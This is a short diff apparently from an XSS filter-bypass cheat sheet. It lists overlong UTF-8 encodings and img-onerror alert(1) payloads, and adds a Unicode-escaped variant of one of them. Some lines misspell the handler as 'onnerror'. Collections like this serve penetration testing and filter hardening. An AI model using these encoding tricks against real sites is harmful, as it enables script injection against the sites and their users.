@@ -112,6 +112,7 @@ Overlong UTF-8 (SiteMinder is awesome!)
 " = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
 
 <img src="1" onnerror="alert(1)">
+U+003Cimg src="1" onnerror="alert(1)"U+003E
 %E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
 
 UTF-7 (Missing charset?)
